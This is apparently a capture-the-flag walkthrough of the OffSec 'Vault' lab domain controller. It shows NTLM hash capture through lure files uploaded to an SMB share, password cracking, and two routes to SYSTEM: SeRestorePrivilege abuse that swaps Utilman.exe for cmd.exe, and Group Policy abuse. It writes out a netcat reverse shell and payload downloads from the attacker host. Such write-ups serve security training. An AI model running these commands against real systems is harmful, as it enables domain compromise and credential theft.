# Offsec Practice: Vault CTF Walkthrough

![LeonardoAi Generated Image](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Vault/screenshots/leonardoai.jpg 'LeonardoAi Generated Image')

## Introduction

The target system is a Windows Active Directory domain controller (`vault.offsec`). The assessment focused on identifying exposed network services, domain misconfigurations, credential exposure vectors, and privilege escalation paths. The goal was to obtain authenticated access, escalate privileges, and achieve full administrative control of the domain controller.

## Machine Enumeration

Nmap finds 14 open ports at the initial scan. Most of the ports are Active Directory generic ports, such as 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, and 5985. The 3389 RDP port is open.

```
┌──(kali㉿kali)-[~/offsec/Practice/Vault]
└─$ nmap -sC -sV 192.168.204.172 -oN nmap.init.txt                                                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-03 09:52 EST
Nmap scan report for 192.168.204.172
Host is up (0.0082s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-03 14:52:56Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.vault.offsec
| Not valid before: 2025-11-13T13:03:26
|_Not valid after:  2026-05-15T13:03:26
| rdp-ntlm-info: 
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-03T14:52:57+00:00
|_ssl-date: 2025-12-03T14:53:37+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-03T14:52:59
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.84 seconds
```

Put the Nmap all-ports scan in the background and start enumerating the SMB service using the `crackmapexec` tool.

```
┌──(kali㉿kali)-[~/offsec/Practice/Vault]
└─$ nmap -p- -T4 192.168.204.172 -oN nmap.all.ports.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-03 09:56 EST
Nmap scan report for 192.168.204.172
Host is up (0.0083s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49679/tcp open  unknown
49706/tcp open  unknown
49851/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 87.74 seconds
```

```
┌──(kali㉿kali)-[~/offsec/Practice/Vault]
└─$ nmap -p 9389,49666,49667,49673,49674,49679,49706,49851 -sC -sV 192.168.204.172 -oN nmap.detail.tcp.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-03 10:01 EST
Nmap scan report for 192.168.204.172
Host is up (0.0091s latency).

PORT      STATE SERVICE    VERSION
9389/tcp  open  mc-nmf     .NET Message Framing
49666/tcp open  msrpc      Microsoft Windows RPC
49667/tcp open  msrpc      Microsoft Windows RPC
49673/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc      Microsoft Windows RPC
49679/tcp open  msrpc      Microsoft Windows RPC
49706/tcp open  msrpc      Microsoft Windows RPC
49851/tcp open  msrpc      Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.59 seconds
```

`Crackmapexec` returns nothing. It looks like without credentials, there is nothing. However, change a tool and use the `smbclient`, and then it gives the result of open shares.

```
┌──(kali㉿kali)-[~/offsec/Practice/Vault]
└─$ crackmapexec smb 192.168.204.172 -u '' -p '' --shares
SMB         192.168.204.172 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False)
SMB         192.168.204.172 445    DC               [-] vault.offsec\: STATUS_ACCESS_DENIED 
SMB         192.168.204.172 445    DC               [-] Error enumerating shares: Error occurs while reading from remote(104)
```

```
┌──(kali㉿kali)-[~/offsec/Practice/Vault]
└─$ smbclient -L //192.168.204.172
Password for [WORKGROUP\kali]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DocumentsShare  Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.204.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Documents Share directory allows us to upload files onto the SMB share. So, it looks like an NTLM theft. Whatever file is uploaded on that share. The system automatically tries to access a specific file, which can lead to stealing the NTLM hash to our `responder`.

```
┌──(kali㉿kali)-[~/…/Practice/Vault/exploit/]
└─$ python3 ~/tools/windows/ntlm_theft/ntlm_theft.py -g all -s 192.168.45.170 -f test
/home/kali/tools/windows/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: test/test.scf (BROWSE TO FOLDER)
Created: test/test-(url).url (BROWSE TO FOLDER)
Created: test/test-(icon).url (BROWSE TO FOLDER)
Created: test/test.lnk (BROWSE TO FOLDER)
Created: test/test.rtf (OPEN)
Created: test/test-(stylesheet).xml (OPEN)
Created: test/test-(fulldocx).xml (OPEN)
Created: test/test.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: test/test-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: test/test-(includepicture).docx (OPEN)
Created: test/test-(remotetemplate).docx (OPEN)
Created: test/test-(frameset).docx (OPEN)
Created: test/test-(externalcell).xlsx (OPEN)
Created: test/test.wax (OPEN)
Created: test/test.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: test/test.asx (OPEN)
Created: test/test.jnlp (OPEN)
Created: test/test.application (DOWNLOAD AND OPEN)
Created: test/test.pdf (OPEN AND ALLOW)
Created: test/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: test/test.library-ms (BROWSE TO FOLDER)
Created: test/Autorun.inf (BROWSE TO FOLDER)
Created: test/desktop.ini (BROWSE TO FOLDER)
Created: test/test.theme (THEME TO INSTALL
Generation Complete.

┌──(kali㉿kali)-[~/…/Practice/Vault/exploit/test]
└─$ cd test

┌──(kali㉿kali)-[~/…/Practice/Vault/exploit/test]
└─$ ls
 Autorun.inf       'test-(externalcell).xlsx'   test.htm                      test.library-ms  'test-(remotetemplate).docx'   test.theme
 desktop.ini       'test-(frameset).docx'      'test-(icon).url'              test.lnk          test.rtf                     'test-(url).url'
 test.application  'test-(fulldocx).xml'       'test-(includepicture).docx'   test.m3u          test.scf                      test.wax
 test.asx          'test-(handler).htm'         test.jnlp                     test.pdf         'test-(stylesheet).xml'        zoom-attack-instructions.txt
```

tried to upload one file at a time to verify which file gives an NTLM hash. Wait for 1-2 minutes in between uploading files. It looks like that `test.Library-ms` file is opened by the system, and an NTLM hash is sent to our responder.

```
---Terminal 1---
┌──(kali㉿kali)-[~/…/Practice/Vault/exploit/test]
└─$ smbclient \\\\192.168.204.172\\DocumentsShare                                    
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> put Autorun.inf
putting file Autorun.inf as \Autorun.inf (3.3 kB/s) (average 3.3 kB/s)
smb: \> dir
  .                                   D        0  Wed Dec  3 10:24:44 2025
  ..                                  D        0  Wed Dec  3 10:24:44 2025
  Autorun.inf                         A       82  Wed Dec  3 10:24:44 2025

		7706623 blocks of size 4096. 909492 blocks available
smb: \> dir
  .                                   D        0  Wed Dec  3 10:24:44 2025
  ..                                  D        0  Wed Dec  3 10:24:44 2025
  Autorun.inf                         A       82  Wed Dec  3 10:24:44 2025

		7706623 blocks of size 4096. 912907 blocks available
smb: \> put desktop.ini
putting file desktop.ini as \desktop.ini (0.4 kB/s) (average 0.9 kB/s)
smb: \> dir
  .                                   D        0  Wed Dec  3 10:26:19 2025
  ..                                  D        0  Wed Dec  3 10:26:19 2025
  Autorun.inf                         A       82  Wed Dec  3 10:24:44 2025
  desktop.ini                         A       50  Wed Dec  3 10:26:19 2025

		7706623 blocks of size 4096. 910168 blocks available
smb: \> put test-(externalcell).xlsx
putting file test-(externalcell).xlsx as \test-(externalcell).xlsx (238.6 kB/s) (average 36.6 kB/s)
smb: \> put test-(frameset).docx
putting file test-(frameset).docx as \test-(frameset).docx (384.1 kB/s) (average 85.2 kB/s)
smb: \> put test-(fulldocx).xml
putting file test-(fulldocx).xml as \test-(fulldocx).xml (336.0 kB/s) (average 218.5 kB/s)
smb: \> put test-(includepicture).docx
putting file test-(includepicture).docx as \test-(includepicture).docx (383.9 kB/s) (average 228.6 kB/s)
smb: \> put test.library-ms
putting file test.library-ms as \test.library-ms (36.2 kB/s) (average 214.7 kB/s)
smb: \> dir
  .                                   D        0  Wed Dec  3 10:27:51 2025
  ..                                  D        0  Wed Dec  3 10:27:51 2025
  Autorun.inf                         A       82  Wed Dec  3 10:24:44 2025
  desktop.ini                         A       50  Wed Dec  3 10:26:19 2025
  test-(externalcell).xlsx            A     5865  Wed Dec  3 10:26:55 2025
  test-(frameset).docx                A    10227  Wed Dec  3 10:27:17 2025
  test-(fulldocx).xml                 A    72588  Wed Dec  3 10:27:25 2025
  test-(includepicture).docx          A    10220  Wed Dec  3 10:27:40 2025
  test.library-ms                     A     1222  Wed Dec  3 10:27:51 2025

		7706623 blocks of size 4096. 914278 blocks available

---Terminal 2---
┌──(kali㉿kali)-[~/…/Practice/Vault/exploit/test]
└─$ sudo responder -I tun0 -dPv
...
...
...
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 192.168.204.172
[SMB] NTLMv2-SSP Username : VAULT\anirudh
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:acd4d637e12dbc72:EE9DF4E6D0C40F0A85A44CEAEF654C15:010100000000000000CF9DFD3E64DC01C898B1E7A4E163050000000002000800420041003300300001001E00570049004E002D004C004B0047005600500036003700540058004900360004003400570049004E002D004C004B004700560050003600370054005800490036002E0042004100330030002E004C004F00430041004C000300140042004100330030002E004C004F00430041004C000500140042004100330030002E004C004F00430041004C000700080000CF9DFD3E64DC01060004000200000008003000300000000000000001000000002000000BE3F69B91F1AF51F2BEE6D66F69928BEEBDFF8255EB1ECC647CF9477CF6CEAD0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370030000000000000000000
...
...
...
```

Cracked the NTLM hash of the `anirudh` user using hashcat and found a password, `SecureHM`.

```
C:\Users\ZERO\Desktop\tools\hashcat-7.1.2>hashcat.exe -m 5600 ..\hashes.txt ..\SecLists-master\Passwords\Leaked-Databases\rockyou.txt --force
hashcat (v7.1.2) starting
...
...
...
Dictionary cache hit:
* Filename..: ..\SecLists-master\Passwords\Leaked-Databases\rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

Driver temperature threshold met on GPU #1. Expect reduced performance.
ANIRUDH::VAULT:49d8857b903c6b7f:5971929070c0ac40bb745a37cdd4639c:010100000000000000cf9dfd3e64dc01eb1c96701f2865680000000002000800420041003300300001001e00570049004e002d004c004b0047005600500036003700540058004900360004003400570049004e002d004c004b004700560050003600370054005800490036002e0042004100330030002e004c004f00430041004c000300140042004100330030002e004c004f00430041004c000500140042004100330030002e004c004f00430041004c000700080000cf9dfd3e64dc01060004000200000008003000300000000000000001000000002000000be3f69b91f1af51f2bee6d66f69928beebdff8255eb1ecc647cf9477cf6cead0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003100370030000000000000000000:SecureHM

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ANIRUDH::VAULT:49d8857b903c6b7f:5971929070c0ac40bb7...000000
Time.Started.....: Wed Dec 03 15:34:29 2025, (2 secs)
Time.Estimated...: Wed Dec 03 15:34:31 2025, (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (..\SecLists-master\Passwords\Leaked-Databases\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  4915.4 kH/s (0.31ms) @ Accel:46 Loops:1 Thr:64 Vec:1
Speed.#03........:  1119.6 kH/s (12.16ms) @ Accel:57 Loops:1 Thr:63 Vec:1
Speed.#*.........:  6035.1 kH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10608864/14344384 (73.96%)
Rejected.........: 0/10608864 (0.00%)
Restore.Point....: 10373344/14344384 (72.32%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Restore.Sub.#03..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: T987R6 -> SJVVIKJFKF
Candidates.#03...: TWEET123 -> T99036026
Hardware.Mon.#01.: Temp: 42c Util: 37% Core:1732MHz Mem:5501MHz Bus:8
Hardware.Mon.#03.: N/A

Driver temperature threshold met on GPU #1. Expect reduced performance.
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => Started: Wed Dec 03 15:34:25 2025
Stopped: Wed Dec 03 15:34:32 2025
```

Test this credential against the WinRM service, and `anirudh` can successfully log in to the system. 

```
┌──(kali㉿kali)-[~/offsec/Practice/Vault]
└─$ crackmapexec smb 192.168.204.172 -u 'anirudh' -p 'SecureHM' --shares
SMB         192.168.204.172 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False)
SMB         192.168.204.172 445    DC               [+] vault.offsec\anirudh:SecureHM 
SMB         192.168.204.172 445    DC               [+] Enumerated shares
SMB         192.168.204.172 445    DC               Share           Permissions     Remark
SMB         192.168.204.172 445    DC               -----           -----------     ------
SMB         192.168.204.172 445    DC               ADMIN$          READ            Remote Admin
SMB         192.168.204.172 445    DC               C$              READ,WRITE      Default share
SMB         192.168.204.172 445    DC               DocumentsShare                  
SMB         192.168.204.172 445    DC               IPC$            READ            Remote IPC
SMB         192.168.204.172 445    DC               NETLOGON        READ            Logon server share 
SMB         192.168.204.172 445    DC               SYSVOL          READ            Logon server share

┌──(kali㉿kali)-[~/offsec/Practice/Vault]
└─$ crackmapexec winrm 192.168.204.172 -u 'anirudh' -p 'SecureHM'     
SMB         192.168.204.172 5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:vault.offsec)
HTTP        192.168.204.172 5985   DC               [*] http://192.168.204.172:5985/wsman
WINRM       192.168.204.172 5985   DC               [+] vault.offsec\anirudh:SecureHM (Pwn3d!)
```

## Initial Foothold

Get a shell using the WinRM service using the `evil-winrm` tool, but it didn’t work. There is a similar Python tool named `evil-winrm-py`, and it worked.

```
┌──(kali㉿kali)-[~/offsec/Practice/Vault]
└─$ evil-winrm -i vault.offsec -u 'anirudh' -p 'SecureHM'               
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type Errno::EHOSTUNREACH happened, message is No route to host - No route to host - connect(2) for "vault.offsec" port 5985 (vault.offsec:5985)
                                        
Error: Exiting with code 1

┌──(kali㉿kali)-[~/offsec/Practice/Vault]
└─$ evil-winrm -i '192.168.204.172' -u 'anirudh' -p 'SecureHM' 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type NoMethodError happened, message is undefined method `snakecase' for an instance of String
                                        
Error: Exiting with code 1
                                                                                                                                                                            
┌──(kali㉿kali)-[~/offsec/Practice/Vault]
└─$ evil-winrm-py -i '192.168.204.172' -u 'anirudh' -p 'SecureHM'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to '192.168.204.172:5985' as 'anirudh'
evil-winrm-py PS C:\Users\anirudh\Documents> whoami
vault\anirudh
evil-winrm-py PS C:\Users\anirudh\Documents> dir
evil-winrm-py PS C:\Users\anirudh\Documents> cd ../Desktop
evil-winrm-py PS C:\Users\anirudh\Desktop> dir

    Directory: C:\Users\anirudh\Desktop

Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-a----        12/3/2025   6:52 AM             34 local.txt                                                              

evil-winrm-py PS C:\Users\anirudh\Desktop> type local.txt
6c6990f96d9e13430d4f1d8b3331daa8

```

## Privilege Escalation

Two different ways to get administrator access.

1. SeRestorePrivilege method to get Administrator shell
2. Group Policy Object Abuse method to get Administrator shell

### SeRestorePrivilege method to get Administrator shell

In order to get abuse of the `SeRestorePrivilege` privilege. It requires a persistent shell instead of the `evil-winrm-py` shell. For that transfer `nc64.exe` to the victim’s system and make a connection back to the attacker’s netcat listener. Once the netcat listener received the shell. Try to execute the `EnableSeRestorePrivilege.ps1` script to get privilege to modify the `C:\Windows\System32` directory.

[https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1)

```
---Terminal 1---
evil-winrm-py PS C:\Users\anirudh> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State  
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
evil-winrm-py PS C:\Users\anirudh> cd Downloads
evil-winrm-py PS C:\Users\anirudh\Downloads> iwr -uri http://192.168.45.170/EnableSeRestorePrivilege.ps1 -OutFile EnableSeRestorePrivilege.ps1
evil-winrm-py PS C:\Users\anirudh\Downloads> dir

    Directory: C:\Users\anirudh\Downloads

Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-a----        12/3/2025   7:46 AM           3213 EnableSeRestorePrivilege.ps1                                           

evil-winrm-py PS C:\Users\anirudh\Downloads> iwr -uri http://192.168.45.170/nc64.exe -OutFile nc64.exe
evil-winrm-py PS C:\Users\anirudh\Downloads> dir

    Directory: C:\Users\anirudh\Downloads

Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-a----        12/3/2025   7:46 AM           3213 EnableSeRestorePrivilege.ps1                                           
-a----        12/3/2025   7:47 AM          45272 nc64.exe                                                               

evil-winrm-py PS C:\Users\anirudh\Downloads> .\nc64.exe 192.168.45.170 50505 -e powershell.exe

---Terminal 2---
┌──(kali㉿kali)-[~/offsec/Practice/Vault]
└─$ rlwrap nc -lnvp 50505
listening on [any] 50505 ...
connect to [192.168.45.170] from (UNKNOWN) [192.168.204.172] 50624
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\anirudh\Downloads> powershell -ep bypass
powershell -ep bypass
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\anirudh\Downloads> . .\EnableSeRestorePrivilege.ps1
. .\EnableSeRestorePrivilege.ps1
DEBUG: 
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 
 [StructLayout(LayoutKind.Sequential, Pack = 1)]
 public struct TokPriv1Luid
 {
  public int Count;
  public long Luid;
  public int Attr;
 }
 
 public static class Advapi32
 {
  [DllImport("advapi32.dll", SetLastError=true)]
  public static extern bool OpenProcessToken(
   IntPtr ProcessHandle, 
   int DesiredAccess,
   ref IntPtr TokenHandle);
   
  [DllImport("advapi32.dll", SetLastError=true)]
  public static extern bool LookupPrivilegeValue(
   string lpSystemName,
   string lpName,
   ref long lpLuid);
   
  [DllImport("advapi32.dll", SetLastError = true)]
  public static extern bool AdjustTokenPrivileges(
   IntPtr TokenHandle,
   bool DisableAllPrivileges,
   ref TokPriv1Luid NewState,
   int BufferLength,
   IntPtr PreviousState,
   IntPtr ReturnLength);
   
 }
 
 public static class Kernel32
 {
  [DllImport("kernel32.dll")]
  public static extern uint GetLastError();
 }
DEBUG: Current process handle: 2696
DEBUG: Calling OpenProcessToken()
DEBUG: Token handle: 2720
DEBUG: Calling LookupPrivilegeValue for SeRestorePrivilege
DEBUG: SeRestorePrivilege LUID value: 18
DEBUG: Calling AdjustTokenPrivileges
DEBUG: GetLastError returned: 0
```

After getting access to the `System32` directory. Just replace the Utilman.exe with the cmd.exe.

```
PS C:\Users\anirudh\Downloads> ren C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.pwned
ren C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.pwned
PS C:\Users\anirudh\Downloads> ren C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
ren C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

Try to connect to the victim’s system using RDP protocol and click on the `Utilman.exe` application, which popped up the Command Prompt terminal with the administrator access.

![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Vault/screenshots/image.png)

### Group Policy Object Abuse method to get Administrator shell

Enumerate Group Policy Object using the `PowerView.ps1` script. Query command `Get-NetGPO`, which gives GPO in the system.

```
PS C:\Users\anirudh\Downloads> dir
dir

    Directory: C:\Users\anirudh\Downloads

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        12/3/2025   8:06 AM          45272 nc64.exe                                                              
-a----        12/3/2025   8:05 AM         770279 PowerView.ps1                                                         

PS C:\Users\anirudh\Downloads> Import-Module .\PowerView.ps1
Import-Module .\PowerView.ps1
PS C:\Users\anirudh\Downloads> Get-NetGPO
Get-NetGPO

usncreated               : 5672
systemflags              : -1946157056
displayname              : Default Domain Policy
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EA
                           C-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00
                           C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
whenchanged              : 11/19/2021 9:00:32 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 12778
dscorepropagationdata    : {11/19/2021 9:00:32 AM, 11/19/2021 8:51:14 AM, 1/1/1601 12:00:00 AM}
name                     : {31B2F340-016D-11D2-945F-00C04FB984F9}
flags                    : 0
cn                       : {31B2F340-016D-11D2-945F-00C04FB984F9}
iscriticalsystemobject   : True
gpcfilesyspath           : \\vault.offsec\sysvol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
distinguishedname        : CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=vault,DC=offsec
whencreated              : 11/19/2021 8:50:33 AM
versionnumber            : 4
instancetype             : 4
objectguid               : 93130581-3375-49c7-88d3-afdc915a9526
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=vault,DC=offsec

usncreated               : 5675
systemflags              : -1946157056
displayname              : Default Domain Controllers Policy
gpcmachineextensionnames : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 11/19/2021 8:50:33 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 5675
dscorepropagationdata    : {11/19/2021 8:51:14 AM, 1/1/1601 12:00:00 AM}
name                     : {6AC1786C-016F-11D2-945F-00C04fB984F9}
flags                    : 0
cn                       : {6AC1786C-016F-11D2-945F-00C04fB984F9}
iscriticalsystemobject   : True
gpcfilesyspath           : \\vault.offsec\sysvol\vault.offsec\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
distinguishedname        : CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=vault,DC=offsec
whencreated              : 11/19/2021 8:50:33 AM
versionnumber            : 1
instancetype             : 4
objectguid               : 0ccc30ba-3bef-43ac-9c61-ebb814e9a685
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=vault,DC=offsec
```

Search each name of the GPO and check that it can be modified by the anirudh user.

```
PS C:\Users\anirudh\Downloads> Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh
Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh

Trustee     : anirudh
TrusteeType : User
Permission  : GpoEditDeleteModifySecurity
Inherited   : False
```

It looks like `anirudh` can modify the `31B2F340-016D-11D2-945F-00C04FB984F9`. Exploit the Group Exploit Object using `SharpGPOAbuse.exe`.

```
PS C:\Users\anirudh\Downloads> iwr -uri http://192.168.45.170/SharpGPOAbuse.exe -OutFile SharpGPOAbuse.exe
iwr -uri http://192.168.45.170/SharpGPOAbuse.exe -OutFile SharpGPOAbuse.exe
PS C:\Users\anirudh\Downloads> dir
dir

    Directory: C:\Users\anirudh\Downloads

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        12/3/2025   8:06 AM          45272 nc64.exe                                                              
-a----        12/3/2025   8:05 AM         770279 PowerView.ps1                                                         
-a----        12/3/2025   8:11 AM          80896 SharpGPOAbuse.exe                                                     

PS C:\Users\anirudh\Downloads> ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
[+] Domain = vault.offsec
[+] Domain Controller = DC.vault.offsec
[+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec
[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103
[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] File exists: \\vault.offsec\SysVol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] The GPO does not specify any group memberships.
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!

PS C:\Users\anirudh\Downloads> gpupdate /force
gpupdate /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
```

Verify the GPO is updated and `anirudh` is added to the Administrators group.

```
PS C:\Users\anirudh\Downloads> net localgroup Administrators
net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
anirudh
The command completed successfully.
```

Connect to anirudh’s user psexec shell and get an administrator flag.

```
┌──(kali㉿kali)-[~/offsec/Practice/Vault]
└─$ impacket-psexec vault.offsec/anirudh:SecureHM@192.168.204.172                       
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.204.172.....
[*] Found writable share ADMIN$
[*] Uploading file rUFGpIdg.exe
[*] Opening SVCManager on 192.168.204.172.....
[*] Creating service Bxzw on 192.168.204.172.....
[*] Starting service Bxzw.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type \Users\Administrator\Desktop\proof.txt
586797836021acd36dbf6421ecbcef5f
```

## Mitigation & Remediation

